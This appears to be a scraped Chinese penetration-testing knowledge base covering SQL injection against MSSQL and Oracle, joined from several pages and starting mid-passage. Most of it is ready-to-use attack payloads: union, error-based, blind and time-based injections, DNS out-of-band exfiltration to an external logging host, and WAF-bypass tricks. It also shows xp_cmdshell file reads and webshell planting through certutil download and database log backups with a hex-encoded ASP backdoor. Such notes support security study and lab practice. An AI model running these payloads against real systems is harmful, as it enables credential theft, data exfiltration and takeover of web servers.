name not in ('master','model') -- mozhe_db_v2 查询数据库的表名 在获取了当前的数据库后，需要获取当前数据库的表，使用current_database..sysobjects(此时current_database为mozhe_db_v2，所以为mozhe_db_v2..systobjects)，条件为U（用户表） # 查当前数据库的第一个表(默认使用当前数据库) id=-2 union all select top 1 '1',name,'3','4' from sysobjects where xtype='u' id=-2 union all select top 1 '1',name,'3','4' from mozhe_db_v2..sysobjects where xtype='u' # 查当前数据库的第二个表(默认使用当前数据库) id=-2 union all select top 1 '1',name,'3','4' from sysobjects where xtype='u' and name not in ('manage') # 查master数据库的第一个表 id=-2 union all select top 1 '1',name,'3','4' from master..sysobjects where xtype='u' # 查当前数据库的第一个表(默认使用当前数据库) select top 1 table_name from information_schema.tables # 查询master库第一个表名 select top 1 table_name from master.information_schema.tables 二者区别： database.information_schema.tables包含视图 而database..sysobjects where xtype = 'U'只包含用户创建的表 查询列名 现在已经知道了表名为manage，尝试查询列名 # 支持跨库查询 -2 union all select top 1 '1',name,'3','4' from syscolumns where id = (select id from sysobjects where name='manage') -- id -2 union all select top 1 '1',name,'3','4' from syscolumns where id = (select id from sysobjects where name='manage') and name != 'id' -- username -2 union all select top 1 '1',name,'3','4' from syscolumns where id = (select id from sysobjects where name='manage') and name not in ('id','username') -- password # 也可用 -2 union all select top 1 '1',column_name,'3','4' from information_schema.columns where table_name = 'manage' -2 union all select top 1 '1',column_name,'3','4' from mozhe_db_v2.information_schema.columns where table_name = 'manage' # 不支持跨库查询 -2 union all select top 1 '1',name,'3','4' from syscolumns where id = OBJECT_ID('manage') # 也可用 -2 union all select top 1 '1',(select top 1 col_name(object_id('manage'),1) from sysobjects),'3','4' -2 union all select top 1 '1',(select top 1 col_name(object_id('manage'),1) from sysobjects),'3','4' 查值 现在我们已经知道表名、列名了，就可以直接查值了 select 列名 from 表名; -2 union all select '1',username,password,'4' from manage 总结 过程和mysql一模一样，区别就是一些语句的用法差异 报错注入 概念 报错注入通常情况下在服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。 常见的报错注入出现在类型转换错误的情况下，如给db_name()强制转换为int，就会抛出包含数据库名的异常信息。 注入举例 没有自己搭环境，抄几张罗总的截图，谢谢罗总 语句都和联合注入中一样，只不过替换过来稍作修改即可 select * from users where id = '1' and 1 = convert(int,db_name())--+ 报错函数 convert() 函数说明： CONVERT()函数是把⽇期转换为新数据类型的通⽤函数。 CONVERT(data_type(length), data_to_be_converted, style) /* * 注释 ： data_type(length) 转换为⽬标数据类型（带有可选的长度）。 data_to_be_converted 含有需要转换的值。 style 规定⽇期/时间的输出格式。 */ 报错原理： 对于 convert(int,@@version)，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样就能得到的这个SQL查询的结果了。 select * from users where id = '1' and 1 = convert(int,db_name())--+ cast() 函数说明： 此函数将一种数据类型的表达式转换为另一种数据类型。 CAST ( expression AS data_type [ ( length ) ] ) /* * expression：任何有效的表达式。 data_type：目标数据类型。这包括 xml、bigint 和 sql_variant；不能使用别名数据类型。 length：一个可选的整数，用于指定目标数据类型的长度，用于允许用户指定长度的数据类型；默认值为 30。 */ 报错原理： 强制类型转换时，如果类型不匹配将会将数据通过异常的形式抛出 select * from users where id = '1' and 1 = cast((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')) as varchar)--+ SELECT cast(@@version as int) 除法 说明： 在进行除法运算时，如1/db_name()，会尝试将db_name()转化为int而抛出异常信息(隐式转换) select 1/db_name() > 说明： 和上面一样比较时类型转换错误，数字前面也可以加一些其他的运算符，比如~、-等，可能有绕过的作用 select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) > 0--+ select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) = 0--+ select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) db_name() 函数说明： 此函数返回指定数据库的名称 DB_NAME ([ database_id ]) /* * 名称DB_NAME将返回的数据库的标识号 (ID) 。如果调用DB_NAME省略database_id，则DB_NAME返回当前数据库的名称。 返回nvarchar(128) */ 报错原理： 会强制将 database_id 的值转换为 smallint类型，而查询出来的结果为nvarchar，因此导致抛出异常 select * from users where id = '1' and 1 = db_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ file_name() 函数说明： 此函数返回给定文件标识 (ID) 号的逻辑文件名 file_name(id) /* * 其文件名的文件标识号FILE_NAME。file_id具有int数据类型。返回nvarchar(128) file_ID对应于 sys.master_files 目录视图或 sys.database_files 目录视图中的 file_id 列。 */ 报错原理： 和上面一样，类型转换出错，下面一样的就不再写原理了 select * from users where id = '1' and 1 = file_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ filegroup_name() 函数说明： 此函数返回指定文件组标识 (ID) 号的文件组名称。 FILEGROUP_NAME ( filegroup_id ) /* * filegroup_id: 将返回其文件组名称 FILEGROUP_NAME 的文件组 ID 号，filegroup_id 具有 smallint 数据类型。 */ select * from users where id = '1' and 1 = filegroup_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ col_name() 函数说明： 此函数根据表列的表标识号和列标识号值返回表列的名称 COL_NAME ( table_id , column_id ) /* * table_id 自变量具有一个 int 数据类型 column_id 自变量具有一个 int 数据类型,返回系统名称 */ select * from users where id = '1' and 1 = col_name(1, (select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ object_name() 函数说明： 此函数返回架构范围内对象的数据库对象名称 OBJECT_NAME ( object_id [, database_id ] ) /* * object_id 的数据类型为 int，并假定为指定数据库或当前数据库上下文中的架构范围内的对象 database_id 的数据类型为 int。要在其中查找对象的数据库的 ID 返回sysname */ select * from users where id = '1' and 1 = object_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ type_name() 函数说明： 返回指定类型 ID 的未限定的类型名称 TYPE_NAME ( type_id ) /* * type_id 的数据类型为 int，它可以引用调用方有权访问的任意架构中的类型。返回sysname */ select * from users where id = '1' and 1 = type_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ schema_name() 函数说明： 返回与架构 ID 关联的架构名称 SCHEMA_NAME ( [ schema_id ] ) /* * schema_id 架构的 ID。 schema_id 是 int。如果没有定义 schema_id，则 SCHEMA_NAME 将返回调用方的默认架构的名称。 schema_id 不是有效 ID 时，返回 NULL。 * / 其他函数 上面连续很多的函数都是参数类型的问题，导致异常，其他还有很多，比如 SUSER_NAME() USER_NAME() PERMISSIONS() ... having 1=1 爆表名 说明： having需要与聚合函数group by一起使用，当无group by时，会直接爆出当前表 select * from users where id='1' having 1=1; group by ... having 1=1 爆列名 select * from users where id='1' group by username,id having 1=1; 盲注 布尔盲注 也和mysql一样，不过是一些语句的差异，主要利用语法 # 如果condition为真，那么整条where语句仍然为真 # 如果condition为假，那么整条where语句为假 select * from users where username=$username and (condition) 注入判断 一般通过一些表达式的差异性来确认结果 and 2*3 = 6 -- 正常回显 and 2*3 = 5 -- 错误回显 常用函数 len() ascii() substring() count() 注入举例 过程和mysql布尔盲注过程一样，流程也是判断长度->数据库名->表名->列名->值 语句和联合注入一样，只是因为属于盲注所以多了一些判定条件而已，这里举几个例子来抛砖引玉吧 获取数据库名长度 id=2 and len(db_name()) > 10 -- true id=2 and len(db_name()) > 11 -- false id=2 and len(db_name()) = 11 -- true 说明数据库长度为 11 查看数据库第一位 id=2 and ascii(substring(db_name(),1,1)) > 108 -- true id=2 and ascii(substring(db_name(),1,1)) > 109 -- false id=2 and ascii(substring(db_name(),1,1)) = 109 -- true # 也可以不转换为ascii码判断（最后得出数据库 mozhe_db_v2） id=2 and substring(db_name(),1,1) = 'm' id=2 and substring(db_name(),11,1) = '2' 查看当前数据库有多少表 # 说明有2个表 id=2 and (select count(*) from sysobjects where xtype='U') = 2 -- true 查看第一个表的第一位 # 第一位是m id=2 and ascii(substring((select top 1 name from sysobjects where xtype='u'),1,1)) = 109 -- true 时间盲注 注入判断 类似于布尔盲注，但是从页面内容看不出来差异，只能通过响应时间来判断，因此会用到延时函数 waitfor delay WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。 如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。 语法： # n 为延时多少秒 waitfor delay '0:0:n' # 延时5秒 waitfor delay '0:0:5' 在MSSQL中，默认可使用堆叠查询，这个也是判断mssql与mysql的区别之一，所以在判断注入点有三种方式，如下： 方法一：直接带入查询 id=2 waitfor delay '0:0:5' 方法二：堆叠查询 id=2;waitfor delay '0:0:5' 方法三：判断条件 id=2 if(1=1) waitfor delay '0:0:5' 常用函数 除了刚才布尔盲注用到的常用函数外，还使用到了如下的一些函数，主要是延时和条件判断 waitfor delay '0:0:n' IF...ELSE... case when exp then state1 ELSE state2 end 注入举例 还是举个例子吧，抛砖引玉，大家可以自由发挥 判断当前数据库第一位是不是m if(substring(db_name(),1,1)) = 'm' waitfor delay '0:0:5' DNS带外(OOB)注入 概念 和mysql带外注入类似，只是语法不一样，限制条件不一样，可以用来简化盲注，快速获取数据 如果遇到带有禁用堆栈查询的完全盲SQL注入，则可尝试通过函数 fn_xe_file_target_read_file、fn_get_audit_file和fn_trace_gettable实现DNS带外(OOB)数据泄露。 利用举例 利用fn_xe_file_target_read_file 和 fn_trace_gettable 限制：需要控制服务器权限 -- 原文 exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'+(select db_name())+'.23c999e1.dns.1433.eu.org\\1.xem',null,null)) -- URL编码后 id=2+and+exists(select+*+from+fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select+db_name())%2b'.23c999e1.dns.1433.eu.org\\1.xem',null,null)) -- 原文 exists(select * from fn_trace_gettable('\\\\'+(select db_name())+'.23c999e1.dns.1433.eu.org\\1.trc',default)) -- URL编码后 id=2+and+exists(select+*+from+fn_trace_gettable('\\\\'%2b(select+db_name())%2b'.23c999e1.dns.1433.eu.org\\1.trc',default)) 堆叠注入 MSSQL 默认是可以多语句查询，通过分号;分割，其与mysql不同的是，MSSQL非常灵活，且可执行系统命令，当存在堆叠查询的语句中，就可以考虑执行系统命令，写入webshell，远程下载木马文件，执行命令getshell等等。 id=2;waitfor delay '0:0:5' Order by 注入 概念 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 注入判断 通过order by 列名，查看排序返回内容的顺序 order by name order by id 通过超大数构成SQL语句错误 order by 999 通过延时函数来判断 order by 1 if (1=1) waitfor delay '0:0:5' 注入举例 开启报错 有报错的情况下，可直接接报错注入函数来抛出异常，获取我们想要的数据 order by convert(int,db_name)--+ 关闭报错 无报错的情况下，则考虑使用时间盲注来进行测试 order by 1 if (substring(db_name(),1,1)='m') waitfor delay '0:0:5' 二次注入 同mysql二次注入，不多赘述 文件读写 概述 MSSQL的文件操作要求要有两大前提： 有相应的权限db_owner 知道文件的绝对路径 在mssql中有两个存储过程可以帮我们来找绝对路径：xp_cmdshell和 xp_dirtree 利用xp_dirtree方法来寻找 execute master..xp_dirtree 'c:' -- 列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 -- 只列c:\\目录 execute master..xp_dirtree 'c:',1,1 -- 列c:\\目录、文件 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中 CREATE TABLE tmp (dir varchar(8000),num int,num1 int); insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1; -- 查询数据 select * from tmp; 使用xp_cmdshell查找绝对路径 cmd中寻找某文件 for /r c:\\ %i in (*.asp) do echo %i 因此只需要建立一个表存一个varchar字段就可以了 CREATE TABLE tmp (dir varchar(8000)); insert into tmp(dir) execute master..xp_cmdshell 'for /r c:\\ %i in (*.asp) do echo %i'; -- 查询数据 select * from tmp; 读 读取文件可以创建一个临时表，将本地文件写入该表中（无法远程登录的情况下，使用堆叠注入） -- 建立一个临时表 create table testtable(context ntext); -- 将本地文件写入表中 BULK INSERT testtable FROM 'c:/windows/win.ini' WITH ( DATAFILETYPE = 'char', KEEPNULLS ); -- 查询数据 select context from testtable; -- 删除临时表 drop table testtable; 使用OpenRowset()函数直接读文件 (select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)) 使用xp_cmdshell执行dos命令 -- 有回显的情况下可以直接读 execute master..xp_cmdshell 'type c:/windows/win.ini'; -- 也可以先写入到文件再读 CREATE TABLE tmp (dir varchar(8000)); insert into tmp(dir) execute master..xp_cmdshell 'type c:/windows/win.ini'; -- 查询数据 select * from tmp; 写 利用xp_cmdshell执行dos命令写文件 在得知绝对路径的情况下，可以使用echo写入webshell，如果需要换行则使用>>追加写入，注意如=、> 等前使用^来转义，也可以使用远程下载的方式来下载webshell -- 直接echo写入 exec master..xp_cmdshell 'echo ^> C:\\Inetpub\\wwwroot\\sqlilabs\\test.asp' -- 远程下载 exec master..xp_cmdshell 'certutil.exe -urlcache -split -f \"\" C:\\Inetpub\\wwwroot\\sqlilabs\\test.asp' DB_owner权限LOG备份Getshell 无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马 SQLServer常见的备份策略： 每周一次完整备份 每天一次差异备份 每小时一次事务日志备份 利用前提： 目标机器存在数据库备份文件 ，也就是如果我们利用test数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是完整模式 知道网站的绝对路径 该注入支持堆叠注入 利用语句： -- 修改数据库恢复模式为 完整模式 alter database 数据库名 set RECOVERY FULL; -- 创建一张表cmd，只有一个列 a，类型为image create table cmd (a image); -- 备份表到指定路径 backup log 数据库名 to disk= 'C:\\Inetpub\\wwwroot\\sqlilabs\\1.asp' with init; -- 插入一句话到cmd表里， 的16进制 insert into cmd (a) values(0x3c256576616c20726571756573742822636d642229253e); -- 把操作日志备份到指定文件 backup log 数据库名 to disk='C:\\Inetpub\\wwwroot\\sqlilabs\\2.asp'; -- 删除cmd表 drop table cmd; 执行完成之后会在目标网站根目录下生成1.asp和2.asp文件，其中1.asp 保存数据库，2.asp就是我们需要连接的木马文件 DB_owner权限差异备份Getshell 差异备份有概率会把网站搞崩，所以不建议使用差异备份 利用前提： 知道网站的绝对路径 该注入支持堆叠注入 利用语句： create table [dbo].[test] ([cmd] [image]) insert into [test](cmd) values(0x3c256576616c20726571756573742822636d642229253e) backup database test to disk = 'C:\\Inetpub\\wwwroot\\1.asp' Drop table [test] 技巧 查询当前执行的SQL语句 可以从Access sys.dm_exec_Requests和sys.dm_exec_sql_text中检索当前正在执行的SQL查询 权限：如果user在服务器上拥有VIEW SERVER STATE权限，则用户将看到SQL Server实例上正在执行的所有会话；否则，user将仅看到当前会话。 id=-2 union all select '1','2',(select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)),'4' 一次查询获取所有内容 有两种简单的方法可以在一个查询中检索表的全部内容-使用FOR XML或FOR JSON子句。 FOR XML子句需要指定的模式，如«raw»，因此JSON比较简洁。 -- 基于正常查询 select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns for json auto; select name,',' from master..sysdatabases for xml path(''); -- 基于报错 and 1=(select concat_ws(0x3a,table_schema,table_name,column_name)a from information_schema.columns for json auto) Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-21 15:43:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/03.绕过技巧.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/03.绕过技巧.html","title":"03.绕过技巧","keywords":"","body":" 通用方法 绕过空格 and/or后 参数和UNION之间 UNION和SELECT之间 SELECT和后续参数 绕过等号= 绕过注释符 [!TIP] 绕过主要还是利用一些特性来，如数据库的特性、中间件的特性等，所以还是要熟悉函数等 通用方法 通用的方法，就是万金油，无非就是大小写、双写、编码、注释、HPP、垃圾字符、分块传输、WAF特性 官方函数文档：https://docs.microsoft.com/zh-cn/sql/t-sql/functions/functions?view=sql-server-ver15 绕过空格 空格被过滤的情况，常规可以用如下的一些手法： 说明 Payload 使用注释符 select/**/@@version; URL编码空格 + 其他URL编码（换行、Tab等） %0a、%09 MSSQL空白符[0x00-0x20] 如%1e 除了上面的常规手法，还有一些非常规的手法 and/or后 如果是and/or后面的空格需要绕过的话，可以用如下的一些算数符来绕过 ! + -- . \\ ~ 参数和UNION之间 1、浮点数 select * from test where id=1.1union select 1,'2',db_name() from test; 2、1e0形式 select * from test where id=1e0union select 1,'2',db_name() from test; 3、运算符 select * from test where id=1-1union select 1,'2',db_name() from test; select * from test where id=1e-union select 1,'2',db_name() from test; UNION和SELECT之间 1、冒号 select * from test where id=1 union:select 1,'2',db_name() from test; SELECT和后续参数 1、字符集 select * from test where id=1 union select.1,'2',db_name() from test; select * from test where id=1 union select~1,'2',db_name() from test; /* + - . : ~ */ 绕过等号= 过滤了等号或者相关的匹配符，可以采用如下的一些手法来绕过 https://docs.microsoft.com/zh-cn/sql/t-sql/language-elements/like-transact-sql?view=sql-server-ver15 Payload 说明 <>、>、 不等符、大于、小于 select 1 between 1 and 2;select 1 not between 1 and 2; between语句，在两值之间 select 1 in (1);select 1 not in (1); in语句，在集合中 select '123' like '1%'; like模糊匹配 绕过注释符 对注释符过滤的情况下，对我们来说问题可能就是语句不能正常执行 解决办法也很简单，用完整语句给他闭合就OK了，其他语句类似 # 原始 ?id=1 # 完整闭合 ?id=1' and expr and '1'='1 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-07 17:13:53 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/01.常用符号:函数:语句归类.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/01.常用符号:函数:语句归类.html","title":"01.常用符号:函数:语句归类","keywords":"","body":" 常用符号 常用函数 字符函数 数学函数 转换函数 其他函数/表达式 常用语句 获取数据库版本 获取操作系统版本 获取当前用户权限的所有数据库 获取当前数据库 获取用户信息 获取当前数据库中的表名 获取当前数据库下某表的所有列名 查询值 子查询，分页实现limit 常用符号 符号 释义 -- 单行注释符 /**/ 多行注释符 \\ \\ 用于字符拼接 null 表示空字符串 dual 虚拟表，在进行select操作必带 常用函数 字符函数 函数 释义 ascii select ascii('a') from dual 结果97 chr select chr(97) from dual 结果'a' upper SELECT Upper ('abcde') FROM dual 结果：ABCDE lower SELECT lower('ABCDE') FROM dual 结果：abcde initcap SELECT Initcap ('AAA') FROM dual 结果：AaaSELECT Initcap ('aaa') FROM dual 结果：Aaa concat SELECT Concat ('a', 'b') FROM dual 结果：abSelect 'a' \\ \\ 'b' from dual 结果：ab wm_concat 类似mysql中的group_concat，多行结果聚合到一起 substr Select substr('abcde',0,3) from dual 结果：abc length Select length('abcde') from dual 结果：5 replace Select replace('abcde','a','A') from dual 结果：Abcde instr Select instr('Hello World','W') from dual 结果：8Select instr('Hello World','w') from dual 结果：0如果在第一个参数中存在第二个参数，则返回第一个遇到的匹配参数的位置，该方法区分大小写 trim select trim(' Mr Smith ') from dual 结果：Mr Smith lpad select lpad('Smith',10,'') from dual 结果：**Smith rpad select rpad('Smith',10,'') from dual 结果：Smith** 数学函数 函数 释义 round select round(412,-2) from dual; 结果：400向上取整运算，第二个参数指定了取小数点后的几位，如果是5则进一。 Mod select Mod(198,2) from dual 结果：0取模运算 ABS select abs(-2) from dual 结果： 2 Trunc select trunc(412.13,2) from dual 结果：412.13select trunc(412.53) from dual 结果：412向下取整运算，第二个参数指定了取小数点后的几位 转换函数 函数 释义 to_char select to_char(1) from dual 结果：'1' to_number select to_number('1') from dual 结果：1 to_date select to_date('2021-1-1','yyyy-MM-dd') from dual 结果：01-JAN-21 其他函数/表达式 函数 释义 NVL select nvl('string',0) from dual 结果：stringselect nvl('',0) from dual 结果：0从两个表达式返回一个非 null 值 NULLIF select nullif('abc','abc') from dual 结果：空select nullif('abc','abcd') from dual 结果：abc如果两个指定的表达式相等，则返回空值，否则返回第一个表达式 NVL2 select nvl2('a','b','c') from dual 结果：bselect nvl2('','b','c') from dual 结果：c如果第一个参数不为空，则返回第二个参数；否则，返回第三个参数 decode select decode('1','1',1,2) from dual; 结果：1第一个参数是否等于第二个参数，如果等于，则返回第三个参数，否则返回第四个参数，可用于行转列 DBMS_PIPE.RECEIVE_MESSAGE select dbms_pipe.receive_message('o',10)from dual; 结果：1时间注入函数，两个参数，从指定管道获取消息,timeout 为 integer的可选输入参数，用来指定等待时间 case...when...then..else...end select case when 1=1 then 1 else 2 end from dual 结果：1 常用语句 建议直接看：https://bak.gm7.org/sqlwiki.netspi.com/attackQueries/informationGathering/index.html#oracle 获取数据库版本 SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT version FROM v$instance; 获取操作系统版本 SELECT banner FROM v$version where banner like 'TNS%' 获取当前用户权限的所有数据库 SELECT DISTINCT owner FROM all_tables; 获取当前数据库 这里需要说明一下，由于Oracle 中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace），默认情况下，Schema 的名称同用户名称相同，其实在这里用这种方法去查所谓的当前数据库，但是在all_tables里其实都没有，使用SQLMAP跑出来的库也没有，所以当前数据库使用select user from dual SELECT global_name FROM global_name; SELECT name FROM v$database; SELECT instance_name FROM v$instance; SELECT SYS.DATABASE_NAME FROM DUAL; 获取用户信息 -- 当前数据库用户 SELECT user FROM dual; -- 所有数据库用户 SELECT username FROM all_users ORDER BY username; -- 当前用户权限 SELECT * FROM session_privs; -- 用户角色 SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; 获取当前数据库中的表名 -- 以SYSTEM 为例子 -- 所有用户的表 select distinct table_name from all_tables where owner = 'SYSTEM' -- 当前用户的表，这里会有很多不需要的数据，其实不建议使用 select table_name from user_tables; -- 包括系统表，需要高权限 select table_name from dba_tables where owner = 'SYSTEM'; 获取当前数据库下某表的所有列名 select column_name from all_tab_columns where table_name ='USERS_KVHXKJ' 查询值 select USERNAME_ETSGGX,PASSWORD_OEDQBQ from USERS_KVHXKJ 子查询，分页实现limit -- 这里以获取当前用户权限所拥有的数据库 -- 以下是实现limit 1,1 select owner from (select t.owner,rownum as no from (select distinct owner from all_tables)t) where no = 1 -- 实现多个 使用between and select owner from (select t.owner,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 10 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/02.各种注入手法.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/02.各种注入手法.html","title":"02.各种注入手法","keywords":"","body":" 前言 概述 注意 联合查询(UNION)注入 概述 注入流程 注入语句 闭合情况 查询字段数 确定显位 查询数据 报错注入 概述 报错函数 ctxsys.drithsx.sn() XMLType() dbms_xdb_version.checkin() dbms_xdb_version.makeversioned() dbms_xdb_version.uncheckout() dbms_utility.sqlid_to_sqlhash() ordsys.ord_dicom.getmappingxpath() utl_inaddr.*() 盲注 布尔盲注 概述 注入流程 常用函数 注入举例 时间盲注 概述 常用函数 DBMS_PIPE.RECEIVE_MESSAGE 函数注入举例 子查询/超大表构造时间盲注 带外(OOB)注入 概述 利用函数 url_http.request() utl_inaddr.get_host_address() SYS.DBMS_LDAP.INIT() HTTPURITYPE() 扩展 Oracle XXE Oracle 提权漏洞 命令执行 反弹shell 前言 概述 oracle的注入相比于mysql和mssql，利用更难 由于对oracle的数据库注入接触较少，因此可以使用oracle的docker来配合练习oracle的sql语句 靶场环境推荐： 环境 地址 web https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oraclehttps://portswigger.net/web-security/all-labshttp://o1.lab.aqlab.cn:81/?id=1 docker https://github.com/ChaMd5Team/Pentest-tools/tree/master/Oracleinject 注意 与MySQL，MSSQL一样，Oracle数据库也是关系型数据库且支持标准型SQL语句，所以注入方式和其他关系型数据库一样，不过有一点特殊，这里强调一下Oracle查询数据的特性： Oracle使用查询语句获取数据时需要跟上表名，在没有表的情况下可以使用dual，dual是Oracle的一个虚拟表，用来构成select的语法规则，且Oracle保证dual里永远只有一条记录 举例： -- 在mysql，mssql，postgresql中都是正确的 select 1,2; -- 但是在Oracle中，必须要带上dual虚表 select 1,2 from dual; 与Postgresql一样，Oracle 的||是字符串连接符 select 1||2 from dual; -- 12 在oracle中存在concat()函数（用法同Mysql concat()，但只能有两个参数），聚合所有结果的连接函数wm_concat()函数（同mysql group_concat()） select concat(1,2) from dual; -- 12 select concat(1,2,3) from dual; -- ORA-00909: invalid number of arguments -- 创建表和添加数据 CREATE TABLE SYS.test(first_name VARCHAR2(50) NOT NULL,last_name VARCHAR2(50) NOT NULL); insert into test(first_name,last_name) values ('test1','test2'); insert into test(first_name,last_name) values ('test3','test4'); insert into test(first_name,last_name) values ('admin','haha'); select wm_concat(first_name) from test; 4.oracle不支持堆叠查询 联合查询(UNION)注入 概述 联合查询注入，和其他关系型数据库注入方式一致，需要注入的页面有明显的回显位，其作用就是，在原来的查询条件的基础上，通过关键字 union，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union,union all区别： union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序； 注入流程 这里记录完整的流程和语句，其他方式的注入语句类似就不再写了 和其他的UNION注入方式和步骤一样，都是 确认闭合情况 确定字段的数量 确定页面回显位 利用已知回显位查询数据 a.查询数据库基本信息 b.爆库名 c.爆表名 d.爆字段 e.查询敏感信息 注入语句 环境使用portswigger的靶场：https://aca31f611e47df03c0ef5e5100e400c3.web-security-academy.net/ 闭合情况 ' and '1'='1 -- 正常 ' and '1'='0 -- 错误 得出可以使用单引号闭合 查询字段数 还是使用order by order by 2 -- - 正常 order by 3 -- - 不正常 得出列数为2 确定显位 union select '1','2' from dual -- - 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可，也就是为啥下图的Pets前面加了个- 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null或者字符串格式；更改为null后不会在页面显示 可以看出显位是1和2 查询数据 探测Oracle版本 select banner from v$version; select banner from v$version where banner like 'Oracle%'; select version from v$instance; 探测操作系统版本 select banner from v$version where banner like 'TNS%' 探测当前数据库用户 select user from dual; 获取当前数据库用户权限 select privilege from session_privs; -- 数据太多，Oracle 实现limit 使用rownum，构造between...and... select * from (select t.* ,rownum as no from (select * from session_privs)t) where no = 5 select * from (select t.* ,rownum as no from (select * from session_privs)t) where no between 1 and 10 获取用户所拥有权限的数据库 select distinct owner from all_tables 由于Oracle中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace），默认情况下，Schema 的名称同用户名称相同。所以当前数据库为SYSTEM 查询当前数据库中所有表名 -- 所有用户的表 select distinct table_name from all_tables where owner = 'SYSTEM' -- 当前用户的表 select table_name from user_tables; -- 包括系统表 select table_name from dba_tables where owner = 'SYSTEM'; 获取表USERS_QXLHLW的列名 select column_name from all_tab_columns where table_name ='USERS_QXLHLW' 获取字段值 select USERNAME_LHMQBY,PASSWORD_ROVRTF from USERS_QXLHLW 报错注入 概述 使用靶场http://o1.lab.aqlab.cn:81/?id=1 和其他的报错注入一样，在进行报错注入之前，首先要确定目标环境在web页面上是否有错误回显，通常使用order by 大数字，或者构造错误的sql语句来判断，介绍几种报错注入函数，其他payload也就是替换子查询的SQL语句 报错函数 ctxsys.drithsx.sn() select ctxsys.drithsx.sn(1,(select user from dual)) select ctxsys.drithsx.sn(1,(select table_name from (select t.* ,rownum as no from (select * from user_tables)t) where no between 2 and 2)) from dual; -- 一次只能显示一行，所以只能一条一条看 -- web paylaod and ctxsys.drithsx.sn(1,(select user from dual)) = 1 XMLType() select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual; -- web paylaod and (select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null dbms_xdb_version.checkin() select dbms_xdb_version.checkin((select user from dual)) from dual -- web paylaod and (select dbms_xdb_version.checkin((select user from dual)) from dual) is null dbms_xdb_version.makeversioned() select dbms_xdb_version.makeversioned((select user from dual)) from dual -- web paylaod and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null dbms_xdb_version.uncheckout() select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual -- web paylaod and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null dbms_utility.sqlid_to_sqlhash() SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual -- web payload and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null 